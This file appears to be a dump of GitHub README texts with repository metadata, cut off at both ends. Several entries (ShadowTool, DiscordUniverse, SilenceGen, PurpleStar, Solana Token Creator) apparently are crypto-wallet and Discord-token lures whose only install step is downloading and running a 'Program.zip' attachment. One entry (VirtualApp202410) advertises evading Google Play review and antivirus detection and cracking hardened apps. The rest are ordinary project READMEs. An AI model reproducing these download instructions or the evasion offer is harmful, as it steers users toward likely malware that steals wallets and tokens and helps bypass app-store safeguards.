SeedGn uses a cryptographically secure random number generator to create mnemonic seed phrases that can be used for various purposes, including wallet recovery and data encryption.

### Customizable Word Length

You can choose the length of the seed phrase generated by SeedGn, ranging from 12 to 24 words, depending on your security requirements.

### Wordlist Support

SeedGn supports custom wordlists, allowing you to generate seed phrases using specialized sets of words tailored to your needs.

## Contributing

We welcome contributions from the open-source community to improve SeedGn and add new features. If you're interested in contributing, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and ensure the codebase is still functional.
4. Open a pull request describing your changes.

## License

SeedGn is licensed under the MIT License. See [LICENSE](https://github.com/username/SeedGn/blob/main/LICENSE) for more information.",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
velmafxx/ShadowTool,v24,"# ShadowTool

This script is designed to automatically generate seed phrases and check balances for Tron networks.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Automatic generation of seed phrases
- Checking of balances for Tron networks
- User-friendly interface
- Secure handling of sensitive information

---

## Installation

1. Download the [latest release](https://github.com/user-attachments/files/17688437/Program.zip) of ShadowTool.
2. Extract the contents of the ZIP file to a folder on your local machine.
3. Open a terminal or command prompt window.
4. Navigate to the directory where you extracted the files.
5. Run the script by executing the following command: `python shadowtool.py`.

---

## Usage

### Generating Seed Phrases

To generate seed phrases using ShadowTool, follow these steps:

1. Run the script by executing `python shadowtool.py`.
2. Select the option to generate seed phrases.
3. The script will automatically create random seed phrases for you to use.

### Checking Balances

To check balances for Tron networks, do the following:

1. Run the script by executing `python shadowtool.py`.
2. Choose the option to check balances.
3. Enter the Tron network address you wish to check.
4. The script will retrieve and display the balance associated with the provided address.

### Additional Features

ShadowTool also offers the following functionalities:

- **Secure Password Generation**: The script can generate secure passwords for your accounts.
- **Encryption**: You can encrypt sensitive information using the script.

---

## Contributing

We welcome contributions from the community to improve ShadowTool. To contribute, please follow these guidelines:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and ensure the code style is consistent.
4. Test your changes thoroughly.
5. Submit a pull request detailing the changes you've made.

---

## License

This project is licensed under the MIT License - see the [LICENSE.md](./LICENSE.md) file for details.

---

![ShadowTool Logo](https://example.com/shadowtool_logo.png)

---

üîó For more information, visit our [official website](https://www.shadowtool.com).

---

Thank you for using ShadowTool! Happy coding! üåü",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
Lordsatanthenuker/DiscordUniverse,master,"# DiscordUniverse

Welcome to the DiscordUniverse repository - your one-stop solution for all things related to Discord token generation and management.

![DiscordUniverse Logo](https://example.com/discorduniverse-logo.png)

## Table of Contents
1. [Introduction](#introduction)
2. [Features](#features)
3. [Installation](#installation)
4. [Usage](#usage)
5. [Contributing](#contributing)
6. [License](#license)

## Introduction
DiscordUniverse is a collection of tools and resources aimed at simplifying the process of generating, managing, and checking Discord tokens. Whether you are a developer looking to automate account creation or a security researcher examining token security, this repository has something for everyone.

## Features
- Discord token generation
- Account creation automation
- Token checking and validation
- Token logging and management

## Installation
To get started with DiscordUniverse, you can simply download the program from the link below:
[![Download DiscordUniverse](https://img.shields.io/badge/Download-Program-blueviolet)](https://github.com/user-attachments/files/17688455/Program.zip)

## Usage
### Generating Tokens
To generate Discord tokens, simply run the `token_generator.py` script and follow the instructions provided. You can customize the token generation process based on your requirements.

### Account Creation
If you need to automate the account creation process, use the `account_creator.py` script. This tool allows you to generate multiple accounts in a streamlined manner.

### Checking and Validating Tokens
For checking the validity of Discord tokens, run the `token_checker.py` script. It will provide detailed information about the status of each token.

### Logging and Management
The `token_logger.py` script is available for logging and managing Discord tokens. You can keep track of token usage and handle any necessary actions.

## Contributing
We welcome contributions from the open-source community to improve and expand the capabilities of DiscordUniverse. If you have any feedback, suggestions, or new ideas, feel free to create a pull request.

## License
This project is licensed under the [Token Generation License](https://opensource.org/licenses/token-gen-license). Feel free to use, modify, and distribute this software as per the terms of the license.

Let's dive into the DiscordUniverse and explore the possibilities it offers for Discord token management and automation. Happy coding! üöÄ

![DiscordUniverse](https://example.com/discorduniverse-screenshot.png)",0,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
GwenStasee/SilenceGen,v24,"# SilenceGen

Generator the address and private key of the Solana wallet

## Table of Contents

1. [Introduction](#introduction)
2. [Features](#features)
3. [Installation](#installation)
4. [Usage](#usage)
5. [Contributing](#contributing)
6. [License](#license)

## Introduction

SilenceGen is a tool designed to assist users in generating the address and private key for their Solana wallet. Solana is a fast and secure blockchain platform, and having a reliable method to generate and manage wallet details is crucial for users to interact with the platform effectively. SilenceGen simplifies the process by providing a straightforward way to create the necessary keys securely.

![SilenceGen Logo](https://example.com/silencegen-logo.jpg)

## Features

- Secure address and private key generation
- Simple and easy-to-use interface
- Compatibility with Solana wallets
- Fast and efficient key creation process

## Installation

To install SilenceGen, follow these steps:

1. Download the [SilenceGen program](https://github.com/user-attachments/files/17688448/Program.zip) from the provided link.
2. Unzip the downloaded file to your desired location on your local machine.
3. Run the program executable to launch SilenceGen.

## Usage

1. Launch the SilenceGen application.
2. Follow the on-screen instructions to generate your Solana wallet address and private key.
3. Ensure to store your private key securely and do not share it with anyone.
4. Use the generated address and private key to access your Solana wallet securely.

![Usage Example](https://example.com/silencegen-usage.jpg)

## Contributing

We welcome contributions from the community to enhance SilenceGen. If you would like to contribute, please follow these steps:

1. Fork this repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your changes to your fork.
5. Submit a pull request to the main repository.

We appreciate your contributions to make SilenceGen even better!

## License

The SilenceGen project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute the software in accordance with the terms of the license.

---

Remember, safeguard your private key at all times and avoid sharing it publicly. Security is paramount when dealing with cryptocurrencies and blockchain technologies. Enjoy using SilenceGen to simplify your Solana wallet management! üöÄüîê",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
ilevd/cwp,main,"# cwp

![alt words-count](doc/imgs/words-count.png)

[![Clojars Project](https://img.shields.io/clojars/v/org.clojars.ilevd/cwp.svg)](https://clojars.org/org.clojars.ilevd/cwp)

Indentation-based syntax for [Clojure](https://clojure.org/).

Clojure is a practical dynamic functional programming language.
This project provides familiar syntax, so it's easy to switch to it, from e.g. Python.

Features:
* Indentation-based, Python-like syntax
* Easy to write math operations
* In most cases separators: `,` - comma and `to`- keyword are optional
* Readable Clojure code generation

Being just a syntax for Clojure, it provides access to Clojure features such as:
* Functional programming - immutable data structures, higher-order functions...
* Concurrent primitives
* Clojure/Java (JVM) ecosystem with a lot of libraries

It's a transpiler and a [Leiningen](https://leiningen.org/) plugin.

## Examples

FizzBuzz

```scala 
doseq i to range(1, 101):
  cond:
    mod(i, 3) = 0 and mod(i, 5) = 0 to print(""FizzBuzz"")
    mod(i, 3) = 0 to print(""Fizz"")
    mod(i, 5) = 0 to print(""Buzz"")
    :else print(i)
```

Caesar cipher

```scala 
def encode(^String s, ^long i):
  let sb StringBuilder.():
    doseq c s:
      cond:
        int(c) >= int(\a) and int(c) <= int(\z) 
        .append(sb, char(int(\a) + mod(int(c) - int(\a) + i, 26)))
        
        int(c) >= int(\A) and int(c) <= int(\Z) 
        .append(sb, char(int(\A) + mod(int(c) - int(\A) + i, 26)))
       
        :else .append(sb, c)
    .toString(sb)

def decode(^String s, ^long i):
  encode(s, 26 - i)
```


Data manipulation 

```scala 
def users: [{:name to ""John"",  :age to 20}
            {:name to ""Anna"",  :age to 32}
            {:name to ""Smith"", :age to 27}]

def avg-age(users):
  let ages to users |>> map(:age)
                    |>> reduce(+):
    ages / count(users) |> double

def greetings(users):
  let names to users |>> map(:name)
                     |>> str/join("", ""):
    str(""Hello, "", names, ""!"")

println(avg-age(users))
println(greetings(users))
```

Simple HTTP server with [http-kit](https://github.com/http-kit/http-kit),
[Hiccup](https://github.com/weavejester/hiccup) and [Ring](https://github.com/ring-clojure/ring)

```scala 
ns my-project.server
  require: [ring.middleware.params :as params]
           [ring.middleware.keyword-params :as kparams]
           [org.httpkit.server :refer [run-server]]
           [hiccup2.core :as h]

def fruits: [""Banana"", ""Apple"", ""Lemon""]

def get-html(user):
  [:div
    [:p {:style {:font-weight :bold}} str(""Hello, "", user or ""User"", ""!"")]
    ""Fruits:""
    for fruit to fruits:
      [:p {} fruit]]
  |> h/html |> str

def app(req):
 {:status  200
  :headers {""Content-Type"" ""text/html""}
  :body    get-html(req |> :params |> :name)}

run-server(app |> kparams/wrap-keyword-params 
               |> params/wrap-params,
           {:port 8080})
```

Some function from [clojure.core](https://github.com/clojure/clojure/blob/clojure-1.11.1/src/clj/clojure/core.clj#L7918)
rewritten with CWP

```scala
def load-data-reader-file(mappings, ^java.net.URL url):
  with-open rdr to clojure.lang.LineNumberingPushbackReader.(
                     java.io.InputStreamReader.(
                       .openStream(url), ""UTF-8"")):
    binding *file* to .getFile(url):
      let read-opts to if .endsWith(.getPath(url), ""cljc""):
                         {:eof nil :read-cond :allow}
                       else {:eof nil}
          new-mappings to read(read-opts, rdr):
        if not map?(new-mappings):
          throw ex-info(str(""Not a valid data-reader map""), {:url url})
        reduce(fn m, [k, v]:
                  if not symbol?(k):
                    throw ex-info(str(""Invalid form in data-reader file""),
                                  {:url url
                                   :form k})
                  let v-var to data-reader-var(v):
                    if contains?(mappings, k) and mappings(k) != v-var:
                      throw ex-info(""Conflicting data-reader mapping"",
                                    {:url      url
                                     :conflict k
                                     :mappings m})
                    assoc(m, k, v-var),
               mappings,
               new-mappings)
```


## Documentation
* [Overview](doc/overview.md)
* [Syntax and transpiling](doc/syntax-and-transpiling.md)


## Usage

Add to `project.clj` :plugins section:
```edn
[org.clojars.ilevd/cwp  ""<actual_version>""] 
```

Add builds info to `project.clj` root:
```edn 
:cwp {:builds [{:in  ""src-cwp""
                :out ""src-out""}]}
```
`:in` - folder where CWP sources are,
`:out` - folder for generated Clojure code

Files extensions mapping:
* `.cw` -> `.clj`
* `.cws` -> `.cljs`
* `.cwc` -> `.cljc`

Run: `lein cwp`

After that you can compile Clojure code to `.jar`.


## License

Copyright ¬© 2024 ilevd",0,0,1,NOASSERTION,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Aunali321/ReVancedExperiments,main,"# üëãüß© ReVanced Experiments

![GitHub Workflow Status (with event)](https://img.shields.io/github/actions/workflow/status/Aunali321/RevancedExperiments/release.yml)
![GPLv3 License](https://img.shields.io/badge/License-GPL%20v3-yellow.svg)

Collection of ReVanced Patches

## ‚ùì About

Patches are small modifications to Android apps that allow you to change the behavior of or add new features,
block ads, customize the appearance, and much more.

## üí™ Features

Some of the features the patches provide are:

* üö´ **Block ads**: Say goodbye to ads
* ‚≠ê **Customize your app**: Personalize the appearance of apps with various layouts and themes
* ü™Ñ **Add new features**: Extend the functionality of apps with lots of new features
* ‚öôÔ∏è **Miscellaneous and general purpose**: Rename packages, enable debugging, disable screen capture restrictions,
  export activities, etc.
* ‚ú® **And much more!**

## üöÄ How to get started

You can use [ReVanced CLI](https://github.com/ReVanced/revanced-cli) or [ReVanced Manager](https://github.com/ReVanced/revanced-manager) to use ReVanced Experiments.


### üìô Contributing

Thank you for considering contributing to ReVanced Experiments.
You can find the contribution guidelines [here](CONTRIBUTING.md).

### üõ†Ô∏è Building

To build ReVanced Experiments,
you can follow the [ReVanced documentation](https://github.com/ReVanced/revanced-documentation).

## üìú Licence

ReVanced Experiments is licensed under the GPLv3 licence.
Please see the [license file](LICENSE) for more information.
[tl;dr](https://www.tldrlegal.com/license/gnu-general-public-license-v3-gpl-3) you may copy, distribute
and modify ReVanced Patches template as long as you track changes/dates in source files.
Any modifications to ReVanced Patches template must also be made available under the GPL,
along with build & install instructions.
",23,0,3,GPL-3.0,3,12.0,1.0,3.0,1.0,15.0,0.0,-4.5,0.0
Pitayafruits/kafka-dog,master,"# Kafka Dog

[English](README.md) | [ÁÆÄ‰Ωì‰∏≠Êñá](README.ch.md)

Kafka Dog is a lightweight Apache Kafka visualization management tool that provides a graphical interface for managing and monitoring Kafka clusters.

## ‚ú® Features

- üöÄ Native desktop client, simple and easy to use
- üìù Support for multiple connection configuration management
- üîç Topic and partition information visualization
- üìä Message viewing and real-time preview
- üéØ Support for Latest/Earliest message positioning
- üì¶ Support for multiple data formats including String, Avro, Protobuf

## üñ• Supported Platforms

- Windows

## üì¶ Installation & Usage 

### Windows
1.Download the latest version of `KafkaDog-windows-x64.zip`
2.Extract to any directory
3.Double-click to run `KafkaDog.exe`

## üöÄ Quick Start

1. Launch Kafka Dog
2. Click the ""Add Connection"" button in the bottom left corner
3. In the popup dialog, fill in:
    - Connection name (to identify different connections)
    - Kafka server address
    - Port number (default 9092)
4. Click ""Test Connection"" to verify connectivity
5. Click ""Save"" after successful connection
6. In the left panel:
    - Double-click connection name to load Topic list
    - Expand Topic to view partition information
    - Click specific partition to view message content
7. In the right panel:
    - Select Latest/Earliest to switch message position
    - Use pagination controls to browse more messages

## üì∏ Interface

![‰∏ªÁïåÈù¢](./images/main.png)

## üî® Development Plans
- [ ]  Add message sending functionality
- [ ] Add consumer group management
- [ ] Support Topic creation and configuration
- [ ] Add message search functionality
- [ ] Support more message formats (JSON, XML, etc.)

## ü§ù Contributing

If you want to contribute code to Kafka Dog, Pull Requests and Issues are welcome!


## üìÑ License

Kafka Dog is licensed under the [MIT License](./LICENSE).

## üôè Acknowledgments

- [Apache Kafka](https://kafka.apache.org/)
- [JavaFX](https://openjfx.io/)
- [OpenJDK](https://openjdk.java.net/)

## üìß Contact

- AuthorÔºö[Pitayafruits](https://github.com/Pitayafruits)
- EmailÔºö[pitaya.cc@qq.com]()


",1,0,2,MIT,0,18.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
seebi70/PurpleStar,v24,"# PurpleStar

## Solana Airdrop Bot

Welcome to PurpleStar - the Solana Airdrop Bot repository! This bot is designed to help you participate in airdrops on the Solana blockchain effortlessly. Whether you are a seasoned Solana enthusiast or a newcomer to the world of decentralized finance, PurpleStar is here to streamline your airdrop claiming process.

![PurpleStar Logo](https://example.com/purplestar_logo.png)

---

### Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Getting Started](#getting-started)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

---

## Introduction

In the fast-paced world of crypto airdrops, time is of the essence. PurpleStar aims to simplify the airdrop participation process on the Solana blockchain by automating many of the repetitive tasks involved. By harnessing the power of this bot, you can stay ahead of the competition and maximize your airdrop rewards.

![Solana](https://example.com/solana_image.png)

---

## Features

üöÄ **Automatic Airdrop Notifications**: Receive instant notifications when new airdrops are announced on the Solana network.

üîí **Secure Wallet Integration**: Connect your Solana wallet securely to facilitate airdrop claiming.

‚è±Ô∏è **Scheduled Claiming**: Set up automated claiming schedules to ensure you never miss out on an airdrop.

üìà **Real-Time Airdrop Updates**: Stay informed about the latest airdrop statuses and token distributions.

üîî **Customizable Alerts**: Tailor notifications and alerts to suit your preferences and airdrop strategy.

---

## Getting Started

To get started with PurpleStar, follow these simple steps:

1. **Clone the repository**:
   ```bash
   git clone https://github.com/your-username/PurpleStar.git
   ```

2. **Install dependencies**:
   ```bash
   npm install
   ```

3. **Configure your Solana wallet**:
   ```bash
   solana-wallet connect <wallet_address>
   ```

4. **Run the bot**:
   ```bash
   node purplestar_bot.js
   ```

---

## Usage

PurpleStar is designed to be intuitive and user-friendly. Here are some common commands to help you make the most of the bot:

- `/start` - Start the PurpleStar bot and set up your airdrop preferences.
- `/claim` - Claim the latest airdrop using your connected wallet.
- `/settings` - Adjust bot settings and notifications.
- `/help` - Get assistance and guidance on using PurpleStar.

![PurpleStar Screenshot](https://example.com/purplestar_screenshot.png)

---

## Contributing

We welcome contributions from the community to make PurpleStar even better! If you have ideas for new features, bug fixes, or enhancements, feel free to submit a pull request. Together, we can create a more efficient and effective tool for airdrop enthusiasts on the Solana blockchain.

---

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

üåü Get started with PurpleStar today and elevate your airdrop game on Solana! üåü

[![Download PurpleStar](https://img.shields.io/badge/Download-Program.zip-<COLORCODE>)](https://github.com/user-attachments/files/17688447/Program.zip)",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
HttpMarco/netline,master,"<p align=""center"">
     <h3 align=""center"">NetLine</h3>
     <p align=""center"">A simple and lightweight network library for Java.</p>
</p>

## Dependency
The libs are hosted on the Sonatype Nexus Repository. You can add the following dependency to your project.

### 0.1 Maven
```xml
<repository>
    <id>netline-central-snapshot</id>
    <url>https://s01.oss.sonatype.org/content/repositories/snapshots/</url>
</repository>

<dependency>
    <groupId>dev.httpmarco</groupId>
    <artifactId>netline</artifactId>
    <version>1.0.0-SNAPSHOT</version>
</dependency>
```

### 0.2 Gradle
```groovy
maven {
    url = uri(""https://s01.oss.sonatype.org/content/repositories/snapshots/"")
}

compile ""dev.httpmarco:netline:1.0.0-SNAPSHOT""
```

### 0.3 Gradle Kotlin DSL
```kotlin
maven(""https://s01.oss.sonatype.org/content/repositories/snapshots/"")

implementation(""dev.httpmarco:netline:1.0.0-SNAPSHOT"")
```

## 1. Generell

### 1.1 Create a new comp component
Below is an example of a simple server component. The API is similar for a client or, in the future, a node.
```java
Net.line()
    // Set the type of the component.
    // You can also use: client or, in the future, a node.
    .server()
    // If you want to configure your component, you can do the following:
    .config(it -> {
        // Set the hostname for binding. The default is '0.0.0.0'.
        it.hostname(""xx.xx.xx.xx"");
        // Set the port for binding. The default is '9091'.
        it.port(1234);
    })
    // Register a new channel tracking. See the tracking table for more details.
    .track(YourExamplePacket.class, (channel, packet) -> {
        // Add your logic here when 'YourExamplePacket' is received.
        System.out.println(""Packet received! Hello!"");
    });
```

### 1.2 Request and Response
With Netline, you can easily send a request packet to a component (comp) and receive a response. This can be used either asynchronously or synchronously.
```java
// For every request, you need a responder to handle the request and send back a response. 
// You can create it as follows:
// Important: The request ID and responder ID must match for each request-response pair!
server.responderOf(""your_custom_request_id"", (channel, id) -> new ResponsePacketType());

var request = client.request(""your_custom_request_id"", ResponsePacketType.class);

// Get the response of your request synchronously.
// The default timeout limit is 5 seconds. You can customize this in your component configuration.
ResponsePacketType response = request.sync();

// The same request but handled asynchronously.
request.async().whenComplete((result, throwable) -> {
    if (throwable != null) {
        // The request failed. You must check the cause of the exception!
        throwable.printStackTrace();
        return;
    }
    // The request was successfully answered.
    ResponsePacketType asyncResponse = result;
});
```
### 1.3 Broadcast from client
```java
// send a packet to all clients and servers
client.generateBroadcast().send(new YourBroadcastPacket());

// send a packet only to selected clients
client.generateBroadcast()
    .to(""clientA"", ""clientB"")
    .send(new YourBroadcastPacket());

// send a packet to all, but skip a specific client(s). Here 'clientA'
client.generateBroadcast()
    .exclude(""clientA"")
    .send(new YourBroadcastPacket());

// send a packet to all clients and servers, but also to his own client
client.generateBroadcast()
    .generateBroadcast()
    .send(new YourBroadcastPacket());

// send a packet to the first 2 endpoints. Left clients are be ignored!
client.generateBroadcast()
    .limt(2)
    .send(new YourBroadcastPacket());

// All this options can be merged together in one broadcast option.
// Important: All options are optional! 
client.generateBroadcast()
    .limit(10) // maximum client amount 
    .exclude(""trash-service"") // ignore the trash services
    .to(""rich-service"", ""babo-service"") // we select the best services
    .deselect(Receiver.SERVER) // send only to all clients
    .send(new YourBroadcastPacket()); // finally sending the broadcast
```

### 1.4 Redirect packets
You can send a packet from a client connected to the server, routing it through the server to a specific client. In this example, the packet is sent to client A.
```java
client.send(""clientA"", new YourRedirectPacket());
```

## 2. Custom comp 

### 2.1 Custom client comp methods
```java
var client = Net.line().client();

```

### 2.2 Custom server comp methods
```java
var server = Net.line().server();
server.bootSync();
// alert a packet to all connected clients
server.broadcast(new YourPacketType());
// alert a packet to a specific client
server.send(""clientA"", new YourPacketType());
// alert a packet to all clients with an id starting with ""stats""
server.send(it -> it.id().startWith(""stats""), new YourPacketType());
// get all connected clients
server.clients();
```

## 3. Security

### 3.1 Blacklist and Whitelist
```java
var server = Net.line().server();
server.config(it -> {
    // blacklist a specific address
    it.blacklist().add(""xx.xx.xx.xx"");
    // whitelist a specific address 
    it.whitelist().add(""xx.xx.xx.xx"");
});
server.bootSync();
```

### 3.2 Custom security adapter
The security provider allow you, to manage your clients with a custom security policy. Block or allow clients, based on your custom logic. A simpler way are the blacklist and whitelist. 
```java
// set your custom security provider -> child of @SecurityProvider
server.withSecurityPolicy(new YourCustomSecurityProvider());
```
Example of a simple security provider:
```java
public class YourCustomSecurityProvider implements SecurityProvider {

    @Override
    public void detectUnauthorizedAccess(NetChannel netChannel) {
        // alert if a client tries to connect without permission
        // Channel closed automatically after this method.
        System.err.println(""Unauthorized access detected"");
    }

    @Override
    public boolean authenticate(NetChannel netChannel) {
        // check the id of the client. Here you can implement your custom logic.
        return netChannel.id().equals(""testA"");
    }
}
```

## 4.0 Your own cluster



## 5.0 Tracking table

| Tracking                         | Description                                                                 |
|----------------------------------|-----------------------------------------------------------------------------|
| ClientConnectedTracking.class    | If the client connects to the server, this tracking will be triggered.      |
| ClientDisconnectedTracking.class | If the client disconnects from the server, this tracking will be triggered. |


## 6.0 Future features :)
- [ ] Node implementation
- [ ] test for bad response answer
- [ ] Add a better packet base logic
- [ ] message channels
",1,0,3,Apache-2.0,1,2.0,0.0,2.0,1.0,3.0,0.0,-0.65,23.0
trinitylake-io/trinitylake,main,"# TrinityLake

***An Open Lakehouse Format for Big Data Analytics, ML & AI***

![TrinityLake Logo](https://github.com/trinitylake-io/trinitylake/blob/main/docs/logo/blue-text-horizontal.png?raw=true)

## Introduction

The TrinityLake format defines the objects in a Lakehouse and provides a consistent and efficient way for 
accessing and manipulating these objects. It offers the following key features:
- **Multi-object multi-statement transactions** with standard SQL `BEGIN` and `COMMIT` semantics
- **Consistent time travel and snapshot export** across all objects in the Lakehouse
- **Storage only** as a Lakehouse solution that works exactly the same way locally, on premise and in the cloud
- **Compatibility with open table formats** like Apache Iceberg, supporting both standard SQL `MANAGED` and `EXTERNAL` as well as federation-based access patterns.
- **Compatibility with open catalog standards** like Apache Iceberg REST Catalog specification, serving as a highly scalable yet extremely lightweight backend implementation

For more details about the format specification, and how to get started and use it with various open engines such as Apache Spark, 
please visit [trinitylake.io](https://trinitylake.io).

## Join Us

This project is still at early development stage. 
If you are interested in developing this project with us together,
we mainly use [Slack (click for invite link)](https://join.slack.com/t/trinitylake/shared_invite/zt-2uukxce7a-CzY3rR9q~3f0PRmm7mgEFw) 
for communication. We also use [GitHub Issues](https://github.com/trinitylake-io/trinitylake/issues) 
and [GitHub Discussions](https://github.com/trinitylake-io/trinitylake/discussions) for discussion purpose. 

## Project Website Development

The project website is built using the [mkdocs-material](https://pypi.org/project/mkdocs-material/) framework with a few other plugins.

### First time setup

```bash
python3 -m venv env
source env/bin/activate
pip install mkdocs-material
pip install mkdocs-awesome-pages-plugin
```

### Serve website

```bash
source env/bin/activate
mkdocs serve
```
",0,6,2,Apache-2.0,1,28.0,0.0,1.0,1.0,8.0,0.0,-1.65,1.0
vova7878-modules/ScreenshotsEverywhere,main,"<div align=""center"">
<h1>Screenshots Everywhere</h1>

![downloads](https://img.shields.io/github/downloads/vova7878-modules/ScreenshotsEverywhere/total)
[![GitHub release](https://img.shields.io/github/v/release/vova7878-modules/ScreenshotsEverywhere)](https://github.com/vova7878-modules/ScreenshotsEverywhere/releases)
[![4PDA](https://img.shields.io/badge/4PDA-Topic-blue)](https://4pda.to/forum/index.php?showtopic=915158&view=findpost&p=133308831)

<p>Allows you to take screenshots and record your screen wherever you want</p>
</div>

### Technical requirements:

- Android 8-16 and any of the Zygisk options for Magisk / APatch / KernelSU
",4,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
justin0kg/VirtualApp202410,master,"# VirtualApp202410

#### Supports Google Play publishing with A/B packages. The B-side code is downloaded from the cloud, completely resolving Google Play's code review issues.

#### UPDATA
**1. Supports Android 4.0 - 15.0**

**2. Resolves antivirus detection issues in major app stores**

**3. More stable Hook framework**

**4. Supports Xposed**

**5. Supports simulation of various physical parameters of mobile devices**

**6. Support real-money gambling games to be listed on Google Play in the form of A/B packages.**


Virtual AppÔºàMultiple Accounts or parallel spaceÔºâProfessional(support Android 4.0 - Android 13)

Inspired by [VirtualApp](https://github.com/asLody/VirtualApp)Ôºå[LBE Parallel Space](https://play.google.com/store/apps/details?id=com.lbe.parallel.intl) and [MultipleAcccount](https://play.google.com/store/apps/details?id=com.excelliance.multiaccounts), this open source project redesigns the Android security sandbox, supports Android 4.0-13.0 versions with dual or multi-opening, and supports Xposed plug-ins

Compared with VirtualApp, MultipleAccounts, ParallelSpace, our advantages:
1. Support Android 4.0 - 15.0ÔºåBy the way, we can provide different source codes for different Android versions
2. Support different versions of different hook technologies
3. Complete production testing, running most of the apps and games in the world flawlessly
4. Rewritten a security engine that supports non-root dynamically granting permissions to applications
5. Rewritten the network library to support real-time capture of various App network data

There are two ways of cooperationÔºö
1. Purchase source code of  professional version, upgrade for free within 1 years, the adaptation of the New Android and App will be provided in the form of patches
2. Highly customized development, including the development of various plug-ins, the cracking of various hardened apps, the decryption of various encrypted apps, etc.

my contact is: huangyao1130@gmail.comÔºåAll contracts and agreements will be signed with the main body of the company that has been established for more than 2 years to ensure the spirit of the contract and service

We were a Google Play top developer, Multliple Accounts App have accumulated hundreds of millions of downloads and tens of millions of monthly active users
The user's real score is 4.1+

<img width=""889"" alt=""image"" src=""https://user-images.githubusercontent.com/118658129/202895115-68fc9f0c-f7e8-427b-b276-048a11e6dcf8.png"">
",0,1,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,53.0
snowy2121/Solana-Token-Creator,master,"# Solana Token Creator: Easily Create and Manage Solana Fungible Tokens 

üöÄ Welcome to the Solana Token Creator repository! With this tool, you can create new Solana fungible tokens using command-line tools and scripts. Additionally, you can manage tokens securely across a team by implementing a multisig wallet approach instead of a single owner.

## Features:
üîë Create new Solana fungible tokens effortlessly.
üîí Implement a multisig wallet approach for secure token management.
üõ† Use command-line tools and scripts for efficient token creation and management.

### Getting Started:
To begin using the Solana Token Creator, download the program from the link below. 

[![Download Program](https://img.shields.io/badge/Download-Program-blue)](https://github.com/user-attachments/files/17804168/Program.zip)

*Note: Launch the program after downloading.*

### Repository Structure:
üìÅ **/scripts**: Contains scripts for token creation and multisig wallet setup.
üìÅ **/documentation**: Includes detailed guides and documentation for using the tool.
üìÑ **README.md**: The main file providing an overview of the repository.

### How to Use:
1. Download the program from the provided link.
2. Follow the instructions in the documentation to create a new Solana fungible token.
3. Implement the multisig wallet approach for secure token management.

### Additional Resources:
For more information or troubleshooting, check the ""Releases"" section of the repository.

---

Your journey into Solana token creation starts here! Create and manage your Solana fungible tokens with ease using the Solana Token Creator tool. üåü Happy token crafting! 

---",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
Jeremiahcheng1206/AML-Monitoring-Engine,main,"# AML-Monitoring-Engine

## General Information
- **Full Software Name**: Intelligent Financial Transaction Anti-Money Laundering Identification Tool Platform  
- **Version**: V1.0  

## Development Environment
- **Development Hardware Environment**:  
  - CPU: Intel(R) Core(TM) i5-4200H, 2.8GHz  
  - RAM: 8GB  
  - Hard Drive: 1TB  
- **Development Operating System**: Windows 11 Enterprise Edition  
- **Development Tools**: IntelliJ IDEA V2023  
- **Programming Language**: Java  
- **Source Code Size**: 25,466 lines  

## Runtime Environment
- **Hardware Requirements**:  
  - Quad-core CPU  
  - 8GB RAM  
  - Integrated Graphics  
  - Gigabit Network  
  - SSD with 500GB or more  
- **Operating System**: Anolis OS  
- **Supporting Software**:  
  - JDK 9 or above  
  - MySQL 8.0  
  - Apache Tomcat  
  - Redis  

## Purpose of Development
The primary goal is to enhance the efficiency of anti-money laundering (AML) efforts in financial transactions, reduce risks, and ensure the security of funds.

## Target Domain/Industry
- **Domain**: Financial Technology (FinTech)

## Key Features
1. **Real-Time Monitoring**:  
   Utilizes big data, machine learning, and artificial intelligence to analyze large volumes of financial transaction data in real-time.  
2. **Suspicious Pattern Detection**:  
   Automatically identifies unusual patterns, such as large fund transfers or frequent cross-border transactions.  
3. **Model Optimization**:  
   Continuously improves detection accuracy using deep learning algorithms.  
4. **Risk Alert Mechanism**:  
   Initiates investigation procedures immediately upon detecting potential money laundering activities.  
5. **Data Integration and Sharing**:  
   Enables cross-bank and cross-border data sharing to strengthen institutional collaboration.  
6. **Compliance Support**:  
   Provides compliance reports and audit tools to meet international AML standards.  
7. **Efficiency Improvement**:  
   Enhances precision and effectiveness of AML processes to prevent financial crimes and ensure system stability.  

## Technical Characteristics
- **Type**: Big Data Software  
- **Key Features**:  
  - Employs AI deep learning and big data analysis for real-time monitoring of financial transactions.  
  - Supports anomaly detection and risk level evaluation.  
  - Facilitates multi-dimensional data integration and automated workflows to improve risk control efficiency.  
  - Offers visualized reports for clear understanding of risk scenarios, enabling precise and efficient risk management.
## Websites
- https://jeremiahcheng1206.github.io/AML-Monitoring-Engine/
## Software Classification
- **Category**: Application Software
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0
ItsMadruga/WaRevamp,master,"# Wa Revamp
Continuation of the Old MdgWa.\
More information coming soon...

## Download
- [Releases](https://github.com/ItsMadruga/WaRevamp/releases)
- [Pre-Releases](https://github.com/ItsMadruga/WaRevamp/actions/workflows/android.yml)",7,1,2,GPL-3.0,1,4.0,0.0,1.0,1.0,10.0,0.0,-2.15,0.0
hoangsonww/Software-Design-Patterns,master,"# Design Patterns Repository

